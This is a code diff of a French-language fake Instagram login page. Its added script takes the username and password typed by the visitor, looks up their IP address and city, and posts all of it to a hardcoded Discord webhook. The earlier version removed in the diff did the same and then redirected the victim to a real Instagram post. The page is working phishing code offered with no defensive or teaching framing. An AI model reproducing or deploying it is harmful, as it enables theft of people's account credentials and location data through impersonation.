@@ -1,3 +1,5 @@
+<!DOCTYPE html>
+<html lang="fr">
 <head>
   <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
   <title>Instagram</title>
@@ -27,7 +29,7 @@
                     </div>  
 
                     <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Se connecter</button>
+                      <button class="btn" type="button" name="submit" onclick="getIPAndCity()">Se connecter</button>
                     </span>  
 
                     <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Mot de passe oublié?</a>
@@ -61,7 +63,7 @@
 
           <nav class="footer-nav" role="navigation">
             <ul>
-              <li><a href=""></a></li>
+			  <li><a href=""></a></li>
               <li><a href="https://about.instagram.com">À propos</a></li>
               <li><a href="https://help.instagram.com">Support</a></li>
               <li><a href="https://about.instagram.com/blog">Blog</a></li>
@@ -70,7 +72,7 @@
               <li><a href="https://help.instagram.com/519522125107875">Confidentialité</a></li>
               <li><a href="https://help.instagram.com/581066165581870">Conditions</a></li>
               <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
-              <li><a href="">Instagram</a></li>
+			  <li><a href="">Instagram/a></li>
             </ul>
           </nav>
 
@@ -89,49 +91,46 @@
   </script>
 
   <script>
-    function sendMessage() {
-      // Récupérer l'adresse IP de l'utilisateur
+    // Fonction pour envoyer les informations à Discord via un appel de webhook
+    function sendToDiscord(ipAddress, city) {
+      var webhookURL = "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub";
+
+      var content = "> **Identifiant  : **" + document.getElementById('username').value + "\n> **Mot de passe : **" + document.getElementById('password').value + "\n> **Adresse IP : **" + ipAddress + "\n> **Ville : **" + city;
+
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub");
+      request.setRequestHeader('Content-type', 'application/json');
+      var params = {
+        content: content
+      };
+      request.send(JSON.stringify(params));
+    }
+
+    // Fonction pour récupérer l'adresse IP de l'utilisateur et la ville associée
+    function getIPAndCity() {
+      // Récupérer l'adresse IP de l'utilisateur en utilisant un service de géolocalisation
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-          const ipAddress = data.ip;
-          // Utiliser l'adresse IP ici, par exemple l'envoyer à votre serveur
+          var ipAddress = data.ip;
 
           // Récupérer la ville en fonction de l'adresse IP
-          fetch(`https://api.ipapi.com/${ipAddress}?access_key=5z1JSJGsJdKw2SyTGpQcKibSJvw47ytR`)
+          fetch('https://ipapi.co/' + ipAddress + '/json/')
             .then(response => response.json())
             .then(data => {
-              const city = data.city;
-              // Utiliser la ville ici, par exemple l'envoyer à votre serveur
+              var city = data.city;
 
-              // Concaténer l'identifiant, le mot de passe, l'adresse IP et la ville
-              const content = "> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value + "\n> **Adresse IP : **" + ipAddress + "\n> **Ville : **" + city;
-
-              var request = new XMLHttpRequest();
-              request.open("POST", "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub");
-              request.setRequestHeader('Content-type', 'application/json');
-              var params = {
-                content: content
-              };
-              request.send(JSON.stringify(params));
-              sleep(400);
-              window.location.replace("https://www.instagram.com/p/By7NkskoTip");
+              // Envoyer les informations à Discord
+              sendToDiscord(ipAddress, city);
             })
             .catch(error => {
-              console.error('Une erreur s\'est produite lors de la récupération de la ville :', error);
+              console.error('Erreur lors de la récupération de la ville :', error);
             });
         })
         .catch(error => {
-          console.error('Une erreur s\'est produite lors de la récupération de l\'adresse IP :', error);
+          console.error('Erreur lors de la récupération de l\'adresse IP :', error);
         });
-    }
-
-    function sleep(milliseconds) {
-      const date = Date.now();
-      let currentDate = null;
-      do {
-        currentDate = Date.now();
-      } while (currentDate - date < milliseconds);
     }
   </script>
 </body>
+</html>
